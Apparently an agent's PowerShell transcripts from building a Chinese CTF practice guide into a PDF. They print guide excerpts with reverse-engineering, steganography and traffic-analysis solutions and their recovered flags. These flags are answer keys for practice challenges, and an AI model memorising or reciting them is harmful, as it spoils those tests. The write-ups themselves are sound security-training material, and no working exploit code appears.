+2025:## 第三届黄河流域公安院校网络安全技能挑战赛 go_for_it（ID #556）
+2047:## 第三届黄河流域公安院校网络安全技能挑战赛 qgd（ID #557）
+2067:## 第三届黄河流域公安院校网络安全技能挑战赛 R（ID #558）
+2230:## 第一届 OpenHarmony arkt（ID #559）
+2403:## 第一届启航杯 note（ID #563）
+2429:## 第一届启航杯 rainbow（ID #564）
+2451:## 2026安网杯-闸机票根（ID #589）
+2468:## 商丘师范学院第四届网络安全及信息对抗大赛 ezRe（ID 未确认）
+2484:## 商丘师范学院第四届网络安全及信息对抗大赛（校外赛）不劳春风解我忧（ID 未确认）
+2506:## 第九届 XCTF 国际网络攻防联赛总决赛-Tch3s（ID #286）
+2550:## 2025鹏城杯-babyRSA（ID #358）
+2615:## 第三届“长城杯”初赛-EzFlag（ID #367）
+2642:## 第二届 CCF 智能汽车大赛 Digital Key UWB（ID #520）
+2687:## 2026安网杯-五格电文（ID #586）
+2705:## 2026安网杯-联号回执（ID #587）
+2723:## 2026安网杯-密钥生成审计（ID #588）
+2807:## 2026安网杯-Veiled Shell（ID #580）
+2947:## 2026安网杯-外泄流量取证（ID #581）
+2966:## 2026安网杯-像素囚笼1（ID #583）
+3006:## 2026安网杯-可疑流量分析（ID #584）
+3074:## 2026安网杯-班次邮戳（ID #585）
+3168:## 2026安网杯-Prompt Trace（ID #590）
+3234:## 2026安网杯-Poisoned Samples（ID #591）
+3261:## 第十八届 CISCN 决赛 CTF-车联网安全 mqtt（ID 未确认）
+3292:## webmin未授权远程代码执行漏洞（ID #428）
+3327:## Redis未授权导致远程代码执行（ID #442）
+3347:## 2026CCF-Sql注入的应急排查（ID #450）
+3369:## 2026CCF-被入侵的数据库（ID #451）
+=== stats ===
+210024
+
+**********************
+PowerShell transcript end
+End time: 20260929210055
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929210434
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; $m=Join-Path $root '指南\玄机刷题指南_合并源.md'; Write-Output '=== residual submit/status/UI language ==='; rg -n -i '被拒绝|已接受|ACCEPTED|flag.?正确|恭喜你完成|提交后|平台接受|平台验证|平台验收|平台通过|一血|首血|提交回执|平台回执|截图|Computer Use|判题通过|用户明确允许|前台终端查看|没有操作平台|页面唯一步骤|步骤提示|选择本题|页面未给出题目简介|免费题|费用：|0/1|提交|详情页显示免费|详情页标注免费|平台.*免费|步骤.*1/1' $m; Write-Output '=== metadata URL/cost bullets ==='; rg -n '^- (?:平台|题目页|题名|分类|类型|费用|玄机题目 ID)' $m; Write-Output '=== process narration ==='; rg -n -i '我打开题目页|平台提示|页面显示|玄机页面|玄机详情页|详情页显示|页面总体进度|未启动.*收费|前台操作|浏览器操作|终端输出均|选择本题|打开本题详情' $m; Write-Output '=== key sections ==='; Get-Content -LiteralPath $m | Select-Object -Skip 15 -First 17; Get-Content -LiteralPath $m | Select-Object -Skip 2190 -First 44; Get-Content -LiteralPath $m | Select-Object -Skip 2960 -First 35 } finally { Stop-Transcript | Out-Null }
+Process ID: 24712
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== residual submit/status/UI language ===
+
+=== metadata URL/cost bullets ===
+
+=== process narration ===
+
+=== key sections ===
+
+## 2024铁人三项决赛 CTFRE-crazyaes（ID #81）
+
+**题目信息：** 玄机 ID #81；类型 REVERSE；难度 极难。
+
+> **零基础知识点：** PE 是 Windows 可执行文件格式，UPX 是常见压缩壳。自定义 AES 通常复用标准轮结构但改了顺序或常量，因此要逐项对比标准算法。
+
+### 题目信息与结论
+- 附件：crazyaes.exe；原始文件 SHA-256：924E14635E4ECA8823EDC8FC7F857A58F1EA1FEEDBE8210B3585E381C968280C
+- 本地验证：候选输入送入修复后静态解包的程序，得到 WOW!!!
+
+- Flag：flag{Re_1ts_f0n}
+
+本题使用本地附件做离线静态逆向。没有把原始附件直接运行；所有头部修复与解包都在工作副本上进行。没有用联网搜索。
+
+### 先建立证据边界
+题目提供 Windows PE 文件。初始字符串看起来像自定义 AES 检查器：程序读取 flag，将 16 字节输入块做变换后与编译进程序的目标常量比较。文件头有损坏迹象，因此先核对原件哈希，再只制作副本供分析。分析过程中将“程序格式修复”“UPX 解包”“算法反推”“本地运行验证”分成独立步骤，避免把解包器误报或错误候选当成答案。
+
+`analysis/solve_558.py` 不导入外部包，也不启动附件程序。脚本从 raw key 开始重新执行 `key[i] ^= i`、完整 256 轮 KSA、19 轮 PRGA，再按正向公式加密候选。脚本输出：
+
+```text
+raw_key_ascii= lntfvpus
+key_index_xor_i_hex= 6c6f766572757374
+effective_key_ascii= loverust
+target_len= 19
+target_hex= 18590728f4adc8c3b63f2d39ca34d18ef503b0
+ksa_rounds= 256
+candidate_hex= 666c61677b386131633261373363323962327d
+candidate_ascii= flag{8a1c2a73c29b2}
+roundtrip_hex= 18590728f4adc8c3b63f2d39ca34d18ef503b0
+roundtrip_match= True
+```
+
+这同时确认目标常量长度、密钥预处理、状态更新顺序与输出逆式彼此一致。脚本运行命令和逐字节 trace 已记在 PowerShell transcript 中。
+
+在项目根目录 `C:\Users\mzj\Desktop\CTF` 下：
+
+```powershell
+python .\玄机刷题\题目资料\challenge_558\analysis\solve_558.py
+Get-FileHash -Algorithm SHA256 .\玄机刷题\题目资料\challenge_558\R.zip
+Get-FileHash -Algorithm SHA256 .\玄机刷题\题目资料\challenge_558\attachment\R.exe
+```
+
+命令及其输出记录：`题目资料/challenge_558/analysis/powershell_transcript_20260929.txt`。本地静态逆向与往返验证完成；
+
+## 第一届 OpenHarmony arkt（ID #559）
+
+**题目信息：** 玄机 ID #559；类型 REVERSE；难度 中等。
+
+> **零基础知识点：** Harmony ABC 是字节码与常量结构；先正确解析索引和字符串，再按程序顺序逆转自定义 Base64、RSA 和流变换，避免直接猜 flag。
+
+本地逆向恢复出的候选 flag 为：
+
+```text
+flag{b80ebf0f0e210ad73664bdd19c16387e}
+```
+
+附件中的 38 项密文经过逆向后得到该字符串；再按字节码恢复的完整加密流程正向计算，38 项逐一与附件目标相同。
+
+| 项目 | 路径 | SHA-256 |
+|---|---|---|
+1.解析 PNG 与 ZIP 边界：ZIP local header 在偏移 4,956；按文件名长度与 extra field 长度计算出数据起始偏移 4,996；关键字段 `method=8`、`compress_size=113`、`file_size=113`、`CRC32=9d13b619`、`flag_bits=0x1`。
+2.取出完整 113 字节载荷，直接调用 `zlib.decompress(data, wbits=-15)` 按 raw DEFLATE 解压，不跳过任何字节。
+3.解压得到 113 字节明文，其 CRC32 为 `9d13b619`，与 local header 和 central directory 完全一致——**流尾标志、长度、CRC 三项互证**，这才是“解出明文”的证据。
+4.反向验证：跳过前 12 字节再解压会报 `invalid block type`；那 12 个字节（`0dc8b10ec2201000d09daf38`）本身就是 DEFLATE 数据的一部分，不是 ZipCrypto 的随机加密头。
+
+解出的明文：
+
+```text
+Congratulations! You found the secret.
+Here is your reward:
+ZmxhZ3s0YTMxY2FjOWE2NmE4ZTM5OTY5M2Y1NDNhOGM2NmZiOH0=
+```
+
+对最后一行严格 Base64 解码得到 `flag{4a31cac9a66a8e399693f543a8c66fb8}`，符合 `flag{}` 加 32 位小写十六进制字符的格式。
+
+**为什么此前数百万次口令穷举全部无效：** 自写 C 穷举程序对这 12 个 DEFLATE 字节运行 ZipCrypto 解密器，并用 CRC 高字节 `0x9d` 的单字节门槛筛选，所谓“命中”只是错误模型下的随机校验碰撞；`ZipFile.read(..., pwd=...)` 同样按伪标志跳过前 12 字节，因此无论口令是否正确都不可能验证出真正的明文。所有以“破解 ZipCrypto 密码”为目标的候选数与排除结论对本题不成立，不能据此声称已穷举真实密码空间。与口令无关的检查——PNG 区块 CRC、附件哈希、几何测量、位平面与滤波器统计——仍然是各自范围内的有效观测，只是它们都不是本题的载荷。
+
+**本题的教训：** 隐写题里“看起来像标准格式”的标志位本身可能就是伪造的；任何依赖该标志的工具链都会被带偏。判断是否真加密，应直接对原始字节做解压尝试并用 CRC 复核，而不是先相信标志位。
+
+**Flag：** `flag{4a31cac9a66a8e399693f543a8c66fb8}`。
+
+复现材料：脚本 `题目资料/像素囚笼1/分析脚本/solve_pixel_fakezip.py`，明文 `题目资料/像素囚笼1/分析脚本/recovered_secret.txt`，完整命令与输出见 `记录/续攻-Pixel交叉检查.txt` 与 `记录/限时攻关-Pixel-终端记录.txt`。原始 PNG 未被修改。
+
+## 2026安网杯-可疑流量分析（ID #584）
+
+**题目信息：** 玄机 ID #584；类型 MISC；难度 中等。
+
+> **零基础知识点：** DNS 查询也能承载数据。分析 PCAP 时先按协议和域名家族分流，再恢复序号、去重并按编码规则解码；Base32 长度决定补位方式。
+
+- 附件：challenge.pcap
+
+- Flag：flag{242bdddd09b6769d2e48404f6e70d38d}
+
+ZIP 只有 challenge.pcap；没有运行附件代码。
+
+**********************
+PowerShell transcript end
+End time: 20260929210434
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929210726
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; & (Join-Path $root '指南\build.ps1'); if ($LASTEXITCODE -ne 0) { throw "PDF 构建失败，退出码 $LASTEXITCODE" }; Get-Item (Join-Path $root '指南\玄机刷题指南.pdf') | Select-Object FullName,Length,LastWriteTime; Write-Output '=== residual platform workflow/status phrases ==='; Select-String -LiteralPath (Join-Path $root '指南\玄机刷题指南_合并源.md') -Pattern @('被拒绝','已接受','ACCEPTED','FLAG 正确','FLAG 不正确','恭喜你完成','提交后','平台接受','平台验证','平台验收','平台通过','一血','首血','提交回执','平台回执','截图','Computer Use','判题通过','用户明确允许','前台终端查看','页面唯一步骤','步骤提示','收费环境'); Write-Output '=== guide challenge count / category headings ==='; (Select-String -LiteralPath (Join-Path $root '指南\玄机刷题指南_合并源.md') -Pattern '^## .*（ID').Count; Select-String -LiteralPath (Join-Path $root '指南\玄机刷题指南_合并源.md') -Pattern '^# ' | ForEach-Object { $_.Line } } finally { Stop-Transcript | Out-Null }
+Process ID: 18392
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+[1/3] pandoc 转换正文...
+
+[2/3] 正文后处理...
+      LTcaptype 修正 16 处；可断行行内代码 489 处；可断行裸哈希 24 处
+[3/3] xelatex 编译...
+      xelatex 第 1 遍...
+      xelatex 第 2 遍...
+完成：C:\Users\mzj\Desktop\CTF\玄机刷题\指南\玄机刷题指南.pdf  628,184 字节
+
+**********************
+PowerShell transcript end
+End time: 20260929210743
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929210830
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $pdf=Join-Path $root '指南\玄机刷题指南.pdf'; $review=Join-Path $root 'tmp\pdfs\technical_cleanup_review_20260929'; New-Item -ItemType Directory -Path $review -Force | Out-Null; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { pdfinfo $pdf | Select-String 'Pages|Page size|File size'; pdftotext -layout $pdf (Join-Path $review 'guide.txt'); Write-Output '=== final PDF text status scan ==='; Select-String -LiteralPath (Join-Path $review 'guide.txt') -Pattern @('被拒绝','已接受','ACCEPTED','FLAG 正确','FLAG 不正确','恭喜你完成','提交后','平台接受','平台验证','平台验收','平台通过','一血','首血','提交回执','平台回执','Computer Use','判题通过','用户明确允许','页面总体进度'); Write-Output '=== raw markdown heading artifacts ==='; Select-String -LiteralPath (Join-Path $review 'guide.txt') -Pattern '###[# ]|####[# ]|已有完整逐步记录的 12 题|思路总览'; Write-Output '=== document length ==='; (Get-Item (Join-Path $review 'guide.txt')).Length } finally { Stop-Transcript | Out-Null }
+Process ID: 43924
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+Pages:           90
+Page size:       595.28 x 841.89 pts (A4)
+File size:       0 bytes
+
+=== final PDF text status scan ===
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:2281:                 题目资料/PaluMaze_551/verify_accept
+ed_route.py、
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:2282:     • 最终路线验证器及输出：
+                  verify_accepted_route.txt
+=== raw markdown heading artifacts ===
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:566:######*###
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:568:#*########
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:569:#****#####
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:570:####*#####
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:571:##E**#####
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:572:##########
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:573:##########
+玄机刷题\tmp\pdfs\technical_cleanup_review_20260929\guide.txt:574:##########
+=== document length ===
+240927
+**********************
+PowerShell transcript end
+End time: 20260929210831
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929210928
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $pdf=Join-Path $root '指南\玄机刷题指南.pdf'; $review=Join-Path $root 'tmp\pdfs\technical_cleanup_review_20260929'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { pdftoppm -png -r 85 $pdf (Join-Path $review 'page'); if ($LASTEXITCODE -ne 0) { throw 'PDF 渲染失败' }; @'
+from PIL import Image, ImageDraw
+from pathlib import Path
+root = Path(r'C:\Users\mzj\Desktop\CTF\玄机刷题\tmp\pdfs\technical_cleanup_review_20260929')
+files = sorted(root.glob('page-*.png'))
+W, H, C, R = 420, 594, 3, 2
+for start in range(0, len(files), C*R):
+    sheet = Image.new('RGB', (W*C, H*R), 'white')
+    draw = ImageDraw.Draw(sheet)
+    for offset, path in enumerate(files[start:start+C*R]):
+        idx = start + offset
+        page = Image.open(path).convert('RGB').resize((W,H), Image.Resampling.LANCZOS)
+        x, y = (offset % C)*W, (offset // C)*H
+        sheet.paste(page, (x,y))
+        draw.text((x+6,y+5), f'{idx+1:03d}', fill=(190,0,0))
+    sheet.save(root / f'sheet-{start//(C*R)+1:02d}.png')
+print(f'rendered={len(files)} contact_sheets={(len(files)+C*R-1)//(C*R)}')
+'@ | python -; if ($LASTEXITCODE -ne 0) { throw '联系表制作失败' }; Get-ChildItem -LiteralPath $review -Filter 'sheet-*.png' | Select-Object Name,Length } finally { Stop-Transcript | Out-Null }
+Process ID: 39528
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+
+**********************
+PowerShell transcript end
+End time: 20260929210942
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929211339
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; & (Join-Path $root '指南\build.ps1'); if ($LASTEXITCODE -ne 0) { throw 'PDF 构建失败' }; $pdf=Join-Path $root '指南\玄机刷题指南.pdf'; $review=Join-Path $root 'tmp\pdfs\technical_cleanup_review_20260929'; pdfinfo $pdf | Select-String 'Pages|Page size'; pdftotext -layout $pdf (Join-Path $review 'guide-final.txt'); Write-Output '=== platform chatter text scan ==='; Select-String -LiteralPath (Join-Path $review 'guide-final.txt') -Pattern @('被拒绝','已接受','ACCEPTED','FLAG 正确','FLAG 不正确','恭喜你完成','提交后','平台接受','平台验证','平台验收','平台通过','一血','首血','提交回执','平台回执','截图','Computer Use','判题通过','用户明确允许','前台终端查看','页面总体进度'); Write-Output '=== question count and guide outputs ==='; (Select-String -LiteralPath (Join-Path $root '指南\玄机刷题指南_合并源.md') -Pattern '^## .*（ID').Count; Get-Item $pdf,(Join-Path $root '指南\玄机刷题指南_合并源.md') | Select-Object Name,Length,LastWriteTime } finally { Stop-Transcript | Out-Null }
+Process ID: 28024
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+[1/3] pandoc 转换正文...
+
+[2/3] 正文后处理...
+      LTcaptype 修正 16 处；可断行行内代码 489 处；可断行裸哈希 24 处
+[3/3] xelatex 编译...
+      xelatex 第 1 遍...
+      xelatex 第 2 遍...
+完成：C:\Users\mzj\Desktop\CTF\玄机刷题\指南\玄机刷题指南.pdf  628,002 字节
+
+Pages:           90
+Page size:       595.28 x 841.89 pts (A4)
+
+=== platform chatter text scan ===
+=== question count and guide outputs ===
+46
+
+Name          : 玄机刷题指南.pdf
+Length        : 628002
+LastWriteTime : 2026/9/29 21:13:53
+
+
+Name          : 玄机刷题指南_合并源.md
+Length        : 208551
+LastWriteTime : 2026/9/29 21:13:39
+
+**********************
+PowerShell transcript end
+End time: 20260929211353
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929211452
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $pdf=Join-Path $root '指南\玄机刷题指南.pdf'; $review=Join-Path $root 'tmp\pdfs\technical_cleanup_final_20260929'; $prior=Join-Path $root 'tmp\pdfs\technical_cleanup_review_20260929'; New-Item -ItemType Directory -Path $review -Force | Out-Null; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { pdftoppm -png -r 85 $pdf (Join-Path $review 'page'); if ($LASTEXITCODE -ne 0) { throw 'PDF 渲染失败' }; @'
+from PIL import Image, ImageDraw, ImageChops
+from pathlib import Path
+root = Path(r'C:\Users\mzj\Desktop\CTF\玄机刷题\tmp\pdfs\technical_cleanup_final_20260929')
+prior = Path(r'C:\Users\mzj\Desktop\CTF\玄机刷题\tmp\pdfs\technical_cleanup_review_20260929')
+files = sorted(root.glob('page-*.png'))
+old = sorted(prior.glob('page-*.png'))
+changed=[]
+for i,(new,prev) in enumerate(zip(files,old),1):
+    a=Image.open(new).convert('RGB'); b=Image.open(prev).convert('RGB')
+    if a.size != b.size or ImageChops.difference(a,b).getbbox(): changed.append(i)
+W,H,C,R=420,594,3,2
+for start in range(0,len(files),C*R):
+    sheet=Image.new('RGB',(W*C,H*R),'white'); draw=ImageDraw.Draw(sheet)
+    for offset,path in enumerate(files[start:start+C*R]):
+        idx=start+offset; im=Image.open(path).convert('RGB').resize((W,H),Image.Resampling.LANCZOS)
+        x,y=(offset%C)*W,(offset//C)*H; sheet.paste(im,(x,y)); draw.text((x+6,y+5),f'{idx+1:03d}',fill=(190,0,0))
+    sheet.save(root/f'sheet-{start//(C*R)+1:02d}.png')
+print(f'final_pages={len(files)} prior_pages={len(old)} changed_pages={changed}')
+'@ | python -; if ($LASTEXITCODE -ne 0) { throw 'final image comparison failed' } } finally { Stop-Transcript | Out-Null }
+Process ID: 26152
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+**********************
+PowerShell transcript end
+End time: 20260929211507
+**********************
